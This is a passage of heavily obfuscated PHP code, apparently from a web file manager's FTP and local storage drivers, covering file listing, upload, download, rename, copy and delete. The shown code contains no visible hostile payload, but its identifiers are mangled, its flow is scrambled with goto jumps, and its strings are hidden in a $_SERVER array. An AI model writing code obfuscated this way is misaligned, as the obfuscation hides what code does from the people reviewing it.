b’Üà‚§÷²: return $AÁÀõ‘Î½À ? $this->getPathOuter($Eº¿ùÚÛ») : !1; goto EâğôÄ‚—; eˆ»àÑ¹³: $Eº¿ùÚÛ» = rtrim($dƒ¸ÚÎ‘¥Á, $AìØîÊáåâ[8]) . $AìØîÊáåâ[8] . $BàÛ¬èÈ¯æ; $AÁÀõ‘Î½À = @ftp_rename($this->connect, $F¡ì„œ£«ù, $Eº¿ùÚÛ»); $Eº¿ùÚÛ» = $this->iconvApp($Eº¿ùÚÛ»); goto b’Üà‚§÷²; AŒ¹·ĞŒ: $BàÛ¬èÈ¯æ = $this->iconvSystem($BàÛ¬èÈ¯æ); $F¡ì„œ£«ù = $this->iconvSystem($F¡ì„œ£«ù); $dƒ¸ÚÎ‘¥Á = $this->pathFather($F¡ì„œ£«ù); goto eˆ»àÑ¹³; EâğôÄ‚—: } private function folderInfo($b˜Ã‚·á÷„, $b‘›îâ¯‰À = false) { goto e«Ä¶¸ÖÔê; aÒçê°¶ ‡: $E“«ä¦–‹… = $this->iconvSystem($b˜Ã‚·á÷„); if ($b‘›îâ¯‰À) { return array($b‘õÌ¬‡Œù[28] => $c©ª‘‘§ëó, $b‘õÌ¬‡Œù[75] => $F±ôë–èùÕ, $b‘õÌ¬‡Œù[29] => $b‘õÌ¬‡Œù[76]); } $BôÚ—„—Éë = array($b‘õÌ¬‡Œù[28] => $c©ª‘‘§ëó, $b‘õÌ¬‡Œù[75] => $F±ôë–èùÕ, $b‘õÌ¬‡Œù[29] => $b‘õÌ¬‡Œù[76], $b‘õÌ¬‡Œù[187] => 0, $b‘õÌ¬‡Œù[107] => 0, $b‘õÌ¬‡Œù[1161] => !0, $b‘õÌ¬‡Œù[1162] => !0); goto F·È÷‰íÒ‘; e«Ä¶¸ÖÔê: $b‘õÌ¬‡Œù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F±ôë–èùÕ = $this->getPathOuter(rtrim($b˜Ã‚·á÷„, $b‘õÌ¬‡Œù[8])); $c©ª‘‘§ëó = $this->pathThis($F±ôë–èùÕ); goto aÒçê°¶ ‡; F·È÷‰íÒ‘: return $BôÚ—„—Éë; goto f†ßÀ“»£ˆ; f†ßÀ“»£ˆ: } private function fileInfo($A´¤Óöƒô‹, $d‡äë…µÔŒ = false) { goto eÌÜ”Õ¶İÊ; Bë»›æâç£: $Añ¹ÜÙàïÌ = $this->iconvSystem($A´¤Óöƒô‹); if ($d‡äë…µÔŒ) { return array($BŞ³˜ŒŠÈŒ[28] => $aµ çôÇİŒ, $BŞ³˜ŒŠÈŒ[75] => $CÏ ã÷Ë, $BŞ³˜ŒŠÈŒ[29] => $BŞ³˜ŒŠÈŒ[167], $BŞ³˜ŒŠÈŒ[160] => $this->ext($A´¤Óöƒô‹), $BŞ³˜ŒŠÈŒ[77] => $this->size($A´¤Óöƒô‹)); } $EÄ‚îä´˜ = array($BŞ³˜ŒŠÈŒ[28] => $aµ çôÇİŒ, $BŞ³˜ŒŠÈŒ[75] => $CÏ ã÷Ë, $BŞ³˜ŒŠÈŒ[29] => $BŞ³˜ŒŠÈŒ[167], $BŞ³˜ŒŠÈŒ[187] => 0, $BŞ³˜ŒŠÈŒ[107] => @ftp_mdtm($this->connect, $Añ¹ÜÙàïÌ), $BŞ³˜ŒŠÈŒ[160] => $this->ext($A´¤Óöƒô‹), $BŞ³˜ŒŠÈŒ[77] => $this->size($A´¤Óöƒô‹), $BŞ³˜ŒŠÈŒ[1161] => !0, $BŞ³˜ŒŠÈŒ[1162] => !0); goto Aªà½Ë—×´; Aªà½Ë—×´: $EÄ‚îä´˜[$BŞ³˜ŒŠÈŒ[107]] = $EÄ‚îä´˜[$BŞ³˜ŒŠÈŒ[107]] > 0 ? $EÄ‚îä´˜[$BŞ³˜ŒŠÈŒ[107]] : 0; return $EÄ‚îä´˜; goto e‚ó„ŠŠ¤Ü; eÌÜ”Õ¶İÊ: $BŞ³˜ŒŠÈŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÏ ã÷Ë = $this->getPathOuter(rtrim($A´¤Óöƒô‹, $BŞ³˜ŒŠÈŒ[8])); $aµ çôÇİŒ = $this->pathThis($CÏ ã÷Ë); goto Bë»›æâç£; e‚ó„ŠŠ¤Ü: } public function size($e‚›ÓÎ¤¦) { $D‰Ë…‚ªæ = $this->objectMeta($e‚›ÓÎ¤¦); return $D‰Ë…‚ªæ ? $D‰Ë…‚ªæ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function info($b…™ï¤Ï‘) { if ($this->isFile($b…™ï¤Ï‘)) { return $this->fileInfo($b…™ï¤Ï‘, 0); } else { if ($this->isFolder($b…™ï¤Ï‘)) { return $this->folderInfo($b…™ï¤Ï‘); } } return !1; } public function exist($f¡Ü¤–‹ÍÑ) { return $this->objectMeta($f¡Ü¤–‹ÍÑ) ? !0 : !1; } public function isFile($C¹Ï§ßÛ¸) { $b—Á³¸ÎÕ‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÎ´ÆŠÖ½ = $this->objectMeta($C¹Ï§ßÛ¸); return $AÎ´ÆŠÖ½ ? $AÎ´ÆŠÖ½[$b—Á³¸ÎÕ‘[29]] == $b—Á³¸ÎÕ‘[167] : !1; } public function isFolder($bªã¨Üëß¨) { $AçßİÅáœÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÕ‚­öàÁí = $this->objectMeta($bªã¨Üëß¨); return $AÕ‚­öàÁí ? $AÕ‚­öàÁí[$AçßİÅáœÎ[29]] == $AçßİÅáœÎ[76] : !1; } public function listPath($d­ì­À¢´, $d–ß‚›÷ = false) { goto cŠÄ‡ì„Ğ½; EŸõ¦†‡­È: foreach ($A±œ‹¸Ğãè as $d­ì­À¢´) { if ($this->isFolder($d­ì­À¢´)) { $f„ÊÌ¹¾õë[$C¹Öİï­ˆÆ[74]][] = $this->folderInfo($d­ì­À¢´, $d–ß‚›÷); } else { $f„ÊÌ¹¾õë[$C¹Öİï­ˆÆ[73]][] = $this->fileInfo($d­ì­À¢´, $d–ß‚›÷); } } return $f„ÊÌ¹¾õë; goto C’µˆãí‰Ì; cŠÄ‡ì„Ğ½: $C¹Öİï­ˆÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->_isconn()) { return !1; } $d­ì­À¢´ = $this->iconvSystem($d­ì­À¢´); goto E¾Ø‘Ş«‡; E¾Ø‘Ş«‡: $A±œ‹¸Ğãè = $this->ftpList($d­ì­À¢´); $f„ÊÌ¹¾õë = array($C¹Öİï­ˆÆ[74] => array(), $C¹Öİï­ˆÆ[73] => array()); if (!$A±œ‹¸Ğãè) { return $f„ÊÌ¹¾õë; } goto EŸõ¦†‡­È; C’µˆãí‰Ì: } public function has($aŒÇ®¢ƒ´´, $Fšï™…Ì¬Í = false, $a«íß‰±Ÿˆ = true) { goto Dãê…§Ğİ; b¡ÓÏ‘©‘´: foreach ($eƒÍ¨æµš as $aŒÇ®¢ƒ´´) { if ($a«íß‰±Ÿˆ) { if (!$this->isFolder($aŒÇ®¢ƒ´´)) { return !0; } } else { if ($this->isFolder($aŒÇ®¢ƒ´´)) { return !0; } } } return !1; goto d‚•ÂÑ¥ãó; AßËˆ¶¿½ò: $eƒÍ¨æµš = $this->ftpList($aŒÇ®¢ƒ´´); if (!$eƒÍ¨æµš) { return !1; } if ($Fšï™…Ì¬Í) { return array($C“ßÖé½§[191] => 0, $C“ßÖé½§[192] => count($eƒÍ¨æµš)); } goto b¡ÓÏ‘©‘´; Dãê…§Ğİ: $C“ßÖé½§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->_isconn()) { return !1; } $aŒÇ®¢ƒ´´ = $this->iconvSystem($aŒÇ®¢ƒ´´); goto AßËˆ¶¿½ò; d‚•ÂÑ¥ãó: } public function listAll($A÷Š÷ö˜İ) { goto FËˆ†æÁğŸ; FËˆ†æÁğŸ: $AäÙº÷ÕïÜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->_isconn()) { return !1; } $A÷Š÷ö˜İ = $this->iconvSystem($A÷Š÷ö˜İ); goto f¾¦·öÄäğ; A»íœµóÎÕ: foreach ($f’”Ú²¤§”[$AäÙº÷ÕïÜ[74]] as $EòÇğ«÷„¢) { $f‡¼ó‡¢“Ø[] = array($AäÙº÷ÕïÜ[75] => $AäÙº÷ÕïÜ[8] . trim(str_replace($A÷Š÷ö˜İ, $AäÙº÷ÕïÜ[33], $EòÇğ«÷„¢), $AäÙº÷ÕïÜ[8]) . $AäÙº÷ÕïÜ[8], $AäÙº÷ÕïÜ[76] => 1, $AäÙº÷ÕïÜ[77] => 0); } foreach ($f’”Ú²¤§”[$AäÙº÷ÕïÜ[73]] as $c¼âè¼§Ë) { $f‡¼ó‡¢“Ø[] = array($AäÙº÷ÕïÜ[75] => $AäÙº÷ÕïÜ[8] . trim(str_replace($A÷Š÷ö˜İ, $AäÙº÷ÕïÜ[33], $c¼âè¼§Ë), $AäÙº÷ÕïÜ[8]), $AäÙº÷ÕïÜ[76] => 0, $AäÙº÷ÕïÜ[77] => $this->size($c¼âè¼§Ë)); } return $f‡¼ó‡¢“Ø; goto AÔ²²Óö¯–; f¾¦·öÄäğ: $f’”Ú²¤§” = array($AäÙº÷ÕïÜ[73] => array(), $AäÙº÷ÕïÜ[74] => array()); $this->recursionFtpFiles($A÷Š÷ö˜İ, $f’”Ú²¤§”); $f‡¼ó‡¢“Ø = array(); goto A»íœµóÎÕ; AÔ²²Óö¯–: } public function getContent($A™ÌÄ‘à¶™) { if (!$this->_isconn()) { return !1; } $A™ÌÄ‘à¶™ = $this->iconvSystem($A™ÌÄ‘à¶™); return $this->fileSubstr($A™ÌÄ‘à¶™); } public function setContent($b½ê¶ÌŠõ, $aÖÁ¬Åïöº = '') { goto fÁ¹ó‡•òÀ; aèëåš’âÍ: return $E›àİ†ÎŒ®; goto eÅ³Ë¥‹Ü§; fÁ¹ó‡•òÀ: if (!$this->_isconn()) { return !1; } $b‰Ä•µ‹êô = $this->pathThis($this->iconvSystem($b½ê¶ÌŠõ)); $FŒë¥Ûî§Ã = $this->tempFile($b‰Ä•µ‹êô); goto Añ’‚İÁõ; Añ’‚İÁõ: file_put_contents($FŒë¥Ûî§Ã, $aÖÁ¬Åïöº); $E›àİ†ÎŒ® = $this->upload($b½ê¶ÌŠõ, $this->iconvApp($FŒë¥Ûî§Ã)); $this->tempFileRemve($FŒë¥Ûî§Ã); goto aèëåš’âÍ; eÅ³Ë¥‹Ü§: } public function fileSubstr($cÒ…±ğœ³, $aåÄ³àó’ô = 0, $FƒíÙù‘ƒğ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($cÒ…±ğœ³, $aåÄ³àó’ô, $FƒíÙù‘ƒğ); } private function ftpRequest($F‚Ş¯ù, $F·¤äƒ‡© = 0, $dÁøøß”Œï = false) { goto A“Â…ê§Í; BéÏ°®Ğ¶Ù: curl_setopt($a„Û¡àïÚ¼, CURLOPT_RETURNTRANSFER, 1); $Cô½Â¦Ò« = curl_exec($a„Û¡àïÚ¼); curl_close($a„Û¡àïÚ¼); goto dÏó¸•Ä”®; A“Â…ê§Í: $F‚Ş¯ù = $this->iconvSystem($F‚Ş¯ù); $C÷ß®ô¤± = $this->scheme . $this->host . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][4] . $this->port; $a„Û¡àïÚ¼ = curl_init(); goto AÌÊ¬œ×Ğ; dÏó¸•Ä”®: return $Cô½Â¦Ò«; goto b¶‰¶Ì­Ÿ; AÌÊ¬œ×Ğ: curl_setopt($a„Û¡àïÚ¼, CURLOPT_URL, $C÷ß®ô¤± . $this->pathEncode($F‚Ş¯ù)); curl_setopt($a„Û¡àïÚ¼, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($dÁøøß”Œï) { $Fäåº¬éè« = $F·¤äƒ‡© + $dÁøøß”Œï - 1; curl_setopt($a„Û¡àïÚ¼, CURLOPT_RANGE, "{$F·¤äƒ‡©}\55{$Fäåº¬éè«}"); } goto BéÏ°®Ğ¶Ù; b¶‰¶Ì­Ÿ: } public function upload($EÊÔèÙå¥, $dïê‚ºóÚ¾, $a­é—”§õ = false, $d«Şò›±º = REPEAT_REPLACE) { goto A×ØËËÅ¹; Cò‰¢ù„¨‚: $dïê‚ºóÚ¾ = $this->iconvSystem($dïê‚ºóÚ¾); $E°Î•×¨ì = ftp_nb_put($this->connect, $EÊÔèÙå¥, $dïê‚ºóÚ¾, FTP_BINARY); while ($E°Î•×¨ì == FTP_MOREDATA) { $E°Î•×¨ì = ftp_nb_continue($this->connect); } goto Aªø·‘ç¸Î; A×ØËËÅ¹: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($EÊÔèÙå¥))) { return !1; } $EÊÔèÙå¥ = $this->iconvSystem($EÊÔèÙå¥); goto Cò‰¢ù„¨‚; Aªø·‘ç¸Î: if ($E°Î•×¨ì != FTP_FINISHED) { return !1; } return $this->getPathOuter($EÊÔèÙå¥); goto cØİÏºĞ­ï; cØİÏºĞ­ï: } public function download($D‰øÊ“’‡, $Aä˜ñÈà = '') { goto DêØ¹ØÃ±ñ; DêØ¹ØÃ±ñ: if (!$this->_isconn()) { return !1; } $BŠŸÀÄˆÁ¨ = $this->pathFather($Aä˜ñÈà); if (!IO::mkdir($BŠŸÀÄˆÁ¨)) { return !1; } goto aĞÆã­¢ª¬; aĞÆã­¢ª¬: $D‰øÊ“’‡ = $this->iconvSystem($D‰øÊ“’‡); $Aä˜ñÈà = $this->iconvSystem($Aä˜ñÈà); $c˜îÅ·Œ® = ftp_nb_get($this->connect, $Aä˜ñÈà, $D‰øÊ“’‡, FTP_BINARY); goto B®è•ä‰; B®è•ä‰: while ($c˜îÅ·Œ® == FTP_MOREDATA) { $c˜îÅ·Œ® = ftp_nb_continue($this->connect); } if ($c˜îÅ·Œ® != FTP_FINISHED) { return !1; } return $this->iconvApp($Aä˜ñÈà); goto e¬Öõßˆ’‰; e¬Öõßˆ’‰: } private function ftpList($Eß¿‘¯‘ĞÒ) { goto A¤éÄ ğ¥; c•‹‘ä†é”: $aäÂÀ‘×Ğô = array_diff($aäÂÀ‘×Ğô, array($a©İ«å§Ü[91], $a©İ«å§Ü[1164], $Eß¿‘¯‘ĞÒ . $a©İ«å§Ü[91], $Eß¿‘¯‘ĞÒ . $a©İ«å§Ü[1164])); $A…‡ô‘º‡‚ = array(); foreach ($aäÂÀ‘×Ğô as $fòĞÁˆ—á) { if (!strstr($fòĞÁˆ—á, $a©İ«å§Ü[8])) { $fòĞÁˆ—á = $Eß¿‘¯‘ĞÒ . ltrim($fòĞÁˆ—á, $a©İ«å§Ü[8]); } $A…‡ô‘º‡‚[] = $this->iconvApp($fòĞÁˆ—á); } goto BÄÍÒ—ÌŒ; BÄÍÒ—ÌŒ: return $A…‡ô‘º‡‚; goto AÒô÷‹Úİ¶; a¾¦†´ÛÓ: $Eß¿‘¯‘ĞÒ = rtrim($Eß¿‘¯‘ĞÒ, $a©İ«å§Ü[8]) . $a©İ«å§Ü[8]; $aäÂÀ‘×Ğô = @ftp_nlist($this->connect, $Eß¿‘¯‘ĞÒ); if ($aäÂÀ‘×Ğô === !1) { $aäÂÀ‘×Ğô = @ftp_rawlist($this->connect, $Eß¿‘¯‘ĞÒ); foreach ($aäÂÀ‘×Ğô as $CÒ‹ÀÀ£óÜ => $cîëà”¾Ó) { $aäÂÀ‘×Ğô[$CÒ‹ÀÀ£óÜ] = end(explode($a©İ«å§Ü[1163], $cîëà”¾Ó)); } } goto c•‹‘ä†é”; A¤éÄ ğ¥: $a©İ«å§Ü =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->isFolder($Eß¿‘¯‘ĞÒ)) { return !1; } @ftp_chdir($this->connect, $a©İ«å§Ü[8]); goto a¾¦†´ÛÓ; AÒô÷‹Úİ¶: } private function recursionFtpFiles($CÀàÏÜô¿, &$A“¡Ë…¯öò) { $d³¹ˆë‰ÜÃ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->_isconn()) { return !1; } if (!($d–‰Ğ¸«ƒ = $this->ftpList($CÀàÏÜô¿))) { return !1; } foreach ($d–‰Ğ¸«ƒ as $CÀàÏÜô¿) { if ($this->isFolder($CÀàÏÜô¿)) { $this->recursionFtpFiles($CÀàÏÜô¿, $A“¡Ë…¯öò); $A“¡Ë…¯öò[$d³¹ˆë‰ÜÃ[74]][] = $CÀàÏÜô¿; } else { $A“¡Ë…¯öò[$d³¹ˆë‰ÜÃ[73]][] = $CÀàÏÜô¿; } } } private function objectMeta($FÌº“èĞôÄ) { goto báÛŠÁÅè; a£§µ­ËÒè: return $F‚Œ•¥¡ˆï; goto dİ¹Õ‹÷ê; báÛŠÁÅè: $bÔáÙ”±¨ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¹ƒŸè»í = $bÔáÙ”±¨ä[1165] . md5($FÌº“èĞôÄ); $F‚Œ•¥¡ˆï = Cache::get($c¹ƒŸè»í); goto b¸Ğãòº; dË†‡¹Ïñ: $eœÉÎÜ®—Ó = @ftp_size($this->connect, $this->iconvSystem($FÌº“èĞôÄ)); if ($eœÉÎÜ®—Ó != -1) { $F‚Œ•¥¡ˆï = array($bÔáÙ”±¨ä[77] => $eœÉÎÜ®—Ó, $bÔáÙ”±¨ä[29] => $bÔáÙ”±¨ä[167]); } else { $cƒ©™åğ­· = @ftp_chdir($this->connect, $this->iconvSystem($FÌº“èĞôÄ)); $F‚Œ•¥¡ˆï = $cƒ©™åğ­· ? array($bÔáÙ”±¨ä[77] => 0, $bÔáÙ”±¨ä[29] => $bÔáÙ”±¨ä[76]) : !1; } Cache::set($c¹ƒŸè»í, $F‚Œ•¥¡ˆï, 0); goto a£§µ­ËÒè; b¸Ğãòº: if ($F‚Œ•¥¡ˆï !== null && $F‚Œ•¥¡ˆï !== !1) { return $F‚Œ•¥¡ˆï; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $bÔáÙ”±¨ä[8]); goto dË†‡¹Ïñ; dİ¹Õ‹÷ê: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($e¤ô÷ÒÜ¿Ì) { if (substr($e¤ô÷ÒÜ¿Ì, 0, 2) == $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1154]) { $e¤ô÷ÒÜ¿Ì = BASIC_PATH . substr($e¤ô÷ÒÜ¿Ì, 2); } return $e¤ô÷ÒÜ¿Ì; } public function iconvApp($bï£œÀ‰ğ) { $C©ğÑÜœì˜ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $config; return $this->iconvTo($bï£œÀ‰ğ, $config[$C©ğÑÜœì˜[1152]], $config[$C©ğÑÜœì˜[1151]]); } public function iconvSystem($FÕä¢ğš‹Í) { $dÍ­æÇÉæó =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $config; return $this->iconvTo($FÕä¢ğš‹Í, $config[$dÍ­æÇÉæó[1151]], $config[$dÍ­æÇÉæó[1152]]); } public function getPathOuter($F‹ß½©à) { goto e°ˆ£ØÂ˜Ñ; e°ˆ£ØÂ˜Ñ: $fˆß´Á©Ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eáŒÒâ¹º = $this->iconvApp($this->pathBase); $F‹ß½©à = $this->iconvApp($F‹ß½©à); goto Aò„Ç³¨Ş–; Aò„Ç³¨Ş–: if (substr($eáŒÒâ¹º, 0, 2) == $fˆß´Á©Ê[1154]) { $eáŒÒâ¹º = BASIC_PATH . substr($eáŒÒâ¹º, 2); } if (substr($F‹ß½©à, 0, 2) == $fˆß´Á©Ê[1154]) { $F‹ß½©à = BASIC_PATH . substr($F‹ß½©à, 2); } $eáŒÒâ¹º = KodIO::clear($eáŒÒâ¹º); goto d©Ì®ôá•; cĞ®±¹ø¼£: return $this->pathDriver . $fˆß´Á©Ê[8] . ltrim($F‹ß½©à, $fˆß´Á©Ê[8]); goto fø´ë‡×í; d©Ì®ôá•: $F‹ß½©à = KodIO::clear($F‹ß½©à); $F‹ß½©à = substr($F‹ß½©à, strlen($eáŒÒâ¹º)); if (empty($this->pathDriver)) { return $F‹ß½©à; } goto cĞ®±¹ø¼£; fø´ë‡×í: } public function mkfile($dŠÈ˜¿¬é„, $FÂ”—­‚ÁÎ = '', $A¶ĞğêÏƒ = REPEAT_RENAME) { $dŠÈ˜¿¬é„ = $this->iconvSystem($dŠÈ˜¿¬é„); @touch($dŠÈ˜¿¬é„); if ($FÂ”—­‚ÁÎ) { file_put_contents($dŠÈ˜¿¬é„, $FÂ”—­‚ÁÎ); } return is_file($dŠÈ˜¿¬é„) ? $this->getPathOuter($dŠÈ˜¿¬é„) : !1; } public function mkdir($d¨¹×«àƒŠ, $Cµ«ÛÃÜº = REPEAT_SKIP) { $d¨¹×«àƒŠ = $this->iconvSystem($d¨¹×«àƒŠ); if (is_dir($d¨¹×«àƒŠ)) { return $this->getPathOuter($d¨¹×«àƒŠ); } @mkdir($d¨¹×«àƒŠ, 511, !0); return is_dir($d¨¹×«àƒŠ) ? $this->getPathOuter($d¨¹×«àƒŠ) : !1; } public function copyFile($FÄãîš×‡‹, $E†‘ÉÀğ ) { $this->mkdir($this->pathFather($E†‘ÉÀğ )); $FÄãîš×‡‹ = $this->iconvSystem($FÄãîš×‡‹); $E†‘ÉÀğ  = $this->iconvSystem($E†‘ÉÀğ ); $cÇç¾ï®¥µ = @copy($FÄãîš×‡‹, $E†‘ÉÀğ ); return $cÇç¾ï®¥µ ? $this->getPathOuter($E†‘ÉÀğ ) : !1; } public function moveFile($Aí¸–´…ª¡, $cß–¸áİÍÔ) { $this->mkdir($this->pathFather($cß–¸áİÍÔ)); $Aí¸–´…ª¡ = $this->iconvSystem($Aí¸–´…ª¡); $cß–¸áİÍÔ = $this->iconvSystem($cß–¸áİÍÔ); $F·ùºÑâ¸ = intval(@rename($Aí¸–´…ª¡, $cß–¸áİÍÔ)); if (!$F·ùºÑâ¸) { if ($F·ùºÑâ¸ = intval(@copy($Aí¸–´…ª¡, $cß–¸áİÍÔ))) { @unlink($Aí¸–´…ª¡); } } return $F·ùºÑâ¸ ? $this->getPathOuter($cß–¸áİÍÔ) : !1; } public function delFile($B††ÛÊƒ) { $B††ÛÊƒ = $this->iconvSystem($B††ÛÊƒ); if (!@unlink($B††ÛÊƒ)) { @chmod($B††ÛÊƒ, 511); if (!@unlink($B††ÛÊƒ)) { return !1; } } else { return !0; } } public function delFolder($EÃÂ­¤ºÏ) { goto C¯˜œƒô…; A´ƒÚª¿÷‘: if (!($C†ÈøÓäº¿ = opendir($EÃÂ­¤ºÏ))) { return !1; } while (($e¡ç¯ÃôŞî = readdir($C†ÈøÓäº¿)) !== !1) { if ($e¡ç¯ÃôŞî == $FØÙ½ÆšÄÓ[91] || $e¡ç¯ÃôŞî == $FØÙ½ÆšÄÓ[1164]) { continue; } $B°İ·ºßµ¨ = $EÃÂ­¤ºÏ . $FØÙ½ÆšÄÓ[8] . $e¡ç¯ÃôŞî; if (is_file($B°İ·ºßµ¨) || is_link($B°İ·ºßµ¨)) { if (!unlink($B°İ·ºßµ¨)) { chmod($B°İ·ºßµ¨, 511); if (!unlink($B°İ·ºßµ¨)) { return !1; } } } else { if (is_dir($B°İ·ºßµ¨)) { chmod($B°İ·ºßµ¨, 511); $B°İ·ºßµ¨ = $this->iconvApp($B°İ·ºßµ¨); if (!$this->delFolder($B°İ·ºßµ¨)) { return !1; } } } } closedir($C†ÈøÓäº¿); goto Cµ¥“÷å›; C¯˜œƒô…: $FØÙ½ÆšÄÓ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÃÂ­¤ºÏ = $this->iconvSystem($EÃÂ­¤ºÏ); if (!is_dir($EÃÂ­¤ºÏ)) { return !0; } goto A´ƒÚª¿÷‘; Cµ¥“÷å›: return rmdir($EÃÂ­¤ºÏ); goto bñí±ŒÚÚô; bñí±ŒÚÚô: } public function rename($a¿ØØƒ‡À¥, $cïÜ¿ğ¸¾) { goto AÊÂâæÁ¨¯; AÊÂâæÁ¨¯: $EòöŸÑ›ƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D–áÀÊ« = $this->fileNameAuto($this->pathFather($a¿ØØƒ‡À¥), $cïÜ¿ğ¸¾); $D–áÀÊ« = $this->iconvSystem($D–áÀÊ«); goto Fƒ’ºå™Ü; Fƒ’ºå™Ü: $a¿ØØƒ‡À¥ = $this->iconvSystem($a¿ØØƒ‡À¥); $dÍ¬ÛšóÒÎ = $this->pathFather($a¿ØØƒ‡À¥); $c¯È‚Ñæ®Ñ = rtrim($dÍ¬ÛšóÒÎ, $EòöŸÑ›ƒ[8]) . $EòöŸÑ›ƒ[8] . $D–áÀÊ«; goto DĞçÛ›ï˜Ñ; DĞçÛ›ï˜Ñ: $dŞŠ™‘ÅÌĞ = @rename($a¿ØØƒ‡À¥, $c¯È‚Ñæ®Ñ); $c¯È‚Ñæ®Ñ = $this->iconvApp($c¯È‚Ñæ®Ñ); return $dŞŠ™‘ÅÌĞ ? $this->getPathOuter($c¯È‚Ñæ®Ñ) : !1; goto c™ŠĞ†‹‡; c™ŠĞ†‹‡: } public function size($cñÖÌíë§) { $cñÖÌíë§ = $this->iconvSystem($cñÖÌíë§); return (double) abs(sprintf($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1166], @filesize($cñÖÌíë§))); } public function info($cãÉ¤É•ªƒ) { $cãÉ¤É•ªƒ = $this->iconvSystem($cãÉ¤É•ªƒ); if ($this->isFolder($cãÉ¤É•ªƒ)) { return $this->folderInfo($cãÉ¤É•ªƒ); } else { if ($this->isFile($cãÉ¤É•ªƒ)) { return $this->fileInfo($cãÉ¤É•ªƒ); } } return !1; } protected function infoChildren($DÉ¨¬Ñ¸ˆ , &$d˜˜ÚùË´, $aĞ­¬‹ìõŒ = true) { goto D‡§­äÅ‡; CÕ²»ø‚‰ß: closedir($AÄÀ’ËÁ˜À); goto aùñøİè£©; B¼ÁÑÁ×’: if ($aĞ­¬‹ìõŒ) { $DÉ¨¬Ñ¸ˆ  = $this->iconvSystem($DÉ¨¬Ñ¸ˆ ); } if (!($AÄÀ’ËÁ˜À = @opendir($DÉ¨¬Ñ¸ˆ ))) { return; } while (($dè£æéãæ = readdir($AÄÀ’ËÁ˜À)) !== !1) { if ($dè£æéãæ == $B–Ã—©¯ç[91] || $dè£æéãæ == $B–Ã—©¯ç[1164]) { continue; } $bÒ ÕÈÎÌ = $DÉ¨¬Ñ¸ˆ  . $dè£æéãæ; if (is_file($bÒ ÕÈÎÌ) || is_link($bÒ ÕÈÎÌ)) { $d˜˜ÚùË´[$B–Ã—©¯ç[78]]++; $d˜˜ÚùË´[$B–Ã—©¯ç[77]] += (double) abs(sprintf($B–Ã—©¯ç[1166], @filesize($bÒ ÕÈÎÌ))); } else { if (is_dir($bÒ ÕÈÎÌ)) { $d˜˜ÚùË´[$B–Ã—©¯ç[79]]++; $this->infoChildren($bÒ ÕÈÎÌ, $d˜˜ÚùË´, !1); } } } goto CÕ²»ø‚‰ß; D‡§­äÅ‡: $B–Ã—©¯ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; check_abort(); $DÉ¨¬Ñ¸ˆ  = rtrim($DÉ¨¬Ñ¸ˆ , $B–Ã—©¯ç[8]) . $B–Ã—©¯ç[8]; goto B¼ÁÑÁ×’; aùñøİè£©: } private function folderInfo($Bø„•‰Ğì , $F×ä†°‘¶ô = false) { $eå‡œìä›í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bø„•‰Ğì  = rtrim($Bø„•‰Ğì , $eå‡œìä›í[8]) . $eå‡œìä›í[8]; $A…«»Û¡…  = $this->iconvApp($this->pathThis($Bø„•‰Ğì )); if ($F×ä†°‘¶ô) { return array($eå‡œìä›í[28] => $A…«»Û¡… , $eå‡œìä›í[75] => $this->getPathOuter($Bø„•‰Ğì ), $eå‡œìä›í[29] => $eå‡œìä›í[76]); } $aË¾‰äª‘ = array($eå‡œìä›í[28] => $A…«»Û¡… , $eå‡œìä›í[75] => $this->getPathOuter($Bø„•‰Ğì ), $eå‡œìä›í[29] => $eå‡œìä›í[76], $eå‡œìä›í[187] => @filectime($Bø„•‰Ğì ), $eå‡œìä›í[107] => @filemtime($Bø„•‰Ğì ), $eå‡œìä›í[1167] => @fileatime($Bø„•‰Ğì ), $eå‡œìä›í[1161] => is_readable($Bø„•‰Ğì ), $eå‡œìä›í[1162] => is_writable($Bø„•‰Ğì ), $eå‡œìä›í[1168] => get_mode($Bø„•‰Ğì )); return $aË¾‰äª‘; } private function fileInfo($B˜ŞìÈ¸§Û, $FÒ³ƒâ£öŒ = false) { $CÃ–óïä» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÄ ÁÉÂ‚ç = $this->iconvApp($this->pathThis($B˜ŞìÈ¸§Û)); if ($FÒ³ƒâ£öŒ) { return array($CÃ–óïä»[28] => $CÄ ÁÉÂ‚ç, $CÃ–óïä»[75] => $this->getPathOuter($B˜ŞìÈ¸§Û), $CÃ–óïä»[29] => $CÃ–óïä»[167], $CÃ–óïä»[77] => $this->size($B˜ŞìÈ¸§Û), $CÃ–óïä»[160] => $this->ext($CÄ ÁÉÂ‚ç)); } $F§¥š´¸Â• = array($CÃ–óïä»[28] => $CÄ ÁÉÂ‚ç, $CÃ–óïä»[75] => $this->getPathOuter($B˜ŞìÈ¸§Û), $CÃ–óïä»[29] => $CÃ–óïä»[167], $CÃ–óïä»[187] => @filectime($B˜ŞìÈ¸§Û), 